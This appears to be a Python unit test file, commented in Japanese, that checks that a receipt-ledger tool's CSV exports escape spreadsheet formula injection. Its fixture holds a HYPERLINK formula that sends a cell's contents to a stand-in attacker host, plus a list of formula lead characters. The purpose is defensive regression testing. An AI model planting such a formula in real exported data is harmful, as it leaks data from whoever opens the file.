"""CSV に数式を仕込まれないこと。

    cd cli && python3 -m unittest discover tests

見ているのは1つだけ:

    **CSV に出るセルのうち、第三者が中身を決められるものが、
    表計算ソフトで数式として実行されないか。**

請求元・品目・件名・送信元は、どれも受け取ったメールから作る値なので、
送りつける側が自由に決められる。表計算ソフトは先頭が = + - @ のセルを
数式として解釈するため、素通しすると「開いただけで走る」状態になる。

実際に一度落ちている。2026-07-26 に summary 側だけ対策を入れ、detail 側は
掛け忘れていた。detail のほうが件名・送信元を含む分だけ危なかった。
その再発を止めるのがここ。

個別の書き出し関数を1本ずつ確かめるだけでは、3本目を足したときに
また同じ抜け方をする。だから「モジュールにある CSV 書き出しを全部見つけて、
すべてに掛かっていること」を性質として書いてある。
"""

from __future__ import annotations

import csv
import inspect
import sys
import unittest
from decimal import Decimal
from pathlib import Path
from tempfile import TemporaryDirectory

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from receipt_ledger import report  # noqa: E402
from receipt_ledger.analyze import Record  # noqa: E402
from receipt_ledger.report import csv_safe  # noqa: E402

# 表計算ソフトが数式の始まりとして扱う文字。report._FORMULA_LEAD と同じ。
LEADS = ("=", "+", "-", "@", "\t", "\r")


def hostile(lead: str = "=") -> Record:
    """文字列の列を全部「数式に見える値」で埋めたレコード。

    どれか1つでも素通しになっていれば落ちるようにするため、
    実際に攻撃者が触れる列かどうかに関わらず全部埋める。
    """
    payload = f'{lead}HYPERLINK("http://attacker.example/?d="&A1,"x")'
    return Record(
        uid=payload,
        origin=payload,
        date="2026-07-15",
        month="2026-07",
        sender=payload,
        subject=payload,
        merchant=payload,
        item=payload,
        amount=Decimal("630"),
        currency="JPY",
        mailbox=payload,
        message_id=payload,
        billed_by=payload,
    )


def cells(path: Path) -> list[str]:
    """書き出した CSV を、表計算ソフトと同じ単位に戻す。

    引用符の中身まで見たいので、生のテキストではなく csv で読み直す。
    """
    with open(path, newline="", encoding="utf-8-sig") as f:
        return [c for row in csv.reader(f) for c in row]


def csv_writers() -> list[tuple[str, object]]:
    """report にある「CSV を書き出す関数」を集める。

    名前で拾っているので、新しく write_*_csv を足すと自動で対象になる。
    """
    found = []
    for name, obj in inspect.getmembers(report, inspect.isfunction):
        if name.startswith("write_") and name.endswith("_csv"):
            found.append((name, obj))
    return sorted(found)


class FormulaInjection(unittest.TestCase):
    """数式として実行されうるセルが残っていないか。"""

    def test_csv_safe_prefixes_every_lead_character(self):
        for lead in LEADS:
            with self.subTest(lead=repr(lead)):
                self.assertEqual(csv_safe(lead + "SUM(A1)"), "'" + lead + "SUM(A1)")

    def test_csv_safe_leaves_ordinary_values_alone(self):
        # 値を壊さないことも同時に見る。壊す実装なら「安全だが使えない」になる。
        for value in ["PayPal", "2026-07-15", "630", "", "ふつうの件名"]:
            with self.subTest(value=value):
                self.assertEqual(csv_safe(value), value)

    def test_csv_safe_passes_non_strings_through(self):
        # Decimal や int をそのまま渡しても壊れないこと。
        self.assertEqual(csv_safe(Decimal("630")), Decimal("630"))
        self.assertEqual(csv_safe(7), 7)

    def test_every_csv_writer_escapes_every_cell(self):
        """**この1本が再発防止の本体。**

        report にある CSV 書き出しを全部呼び、出たセルを1つ残らず見る。
        書き出しを新しく足して csv_safe を掛け忘れると、ここが落ちる。
        """
        writers = csv_writers()
        # 名前で集めているので、集められなかった場合は静かに0件で通る。
        # それでは「何も検査していない緑」になるので、下限を置く。
        self.assertGreaterEqual(len(writers), 2, "CSV 書き出しを見つけられていない")

        for lead in LEADS:
            for name, func in writers:
                with self.subTest(writer=name, lead=repr(lead)):
                    with TemporaryDirectory() as tmp:
                        out = Path(tmp) / "out.csv"
                        func(out, [hostile(lead)])
                        for cell in cells(out):
                            self.assertFalse(
                                cell.startswith(LEADS),
                                f"{name} が数式として解釈されるセルを出した: {cell!r}",
                            )

    def test_detail_csv_keeps_the_original_text(self):
        """値を壊さずに実行だけ止めていること。

        ' を付けるのは Excel の「以降は文字列」の印なので、
        元の文字列は ' の後ろにそのまま残っていなければならない。
        """
        payload = '=HYPERLINK("http://attacker.example/?d="&A1,"x")'
        with TemporaryDirectory() as tmp:
            out = Path(tmp) / "detail.csv"
            report.write_detail_csv(out, [hostile("=")])
            self.assertIn("'" + payload, cells(out))


class CsvShape(unittest.TestCase):
    """Excel で開くための約束事。壊れると文字化けする。"""

    def test_files_start_with_bom(self):
        for name, func in csv_writers():
            with self.subTest(writer=name):
                with TemporaryDirectory() as tmp:
                    out = Path(tmp) / "out.csv"
                    func(out, [hostile()])
                    self.assertTrue(out.read_bytes().startswith(b"\xef\xbb\xbf"))

    def test_rows_end_with_crlf(self):
        for name, func in csv_writers():
            with self.subTest(writer=name):
                with TemporaryDirectory() as tmp:
                    out = Path(tmp) / "out.csv"
                    func(out, [hostile()])
                    self.assertIn(b"\r\n", out.read_bytes())


if __name__ == "__main__":
    unittest.main()
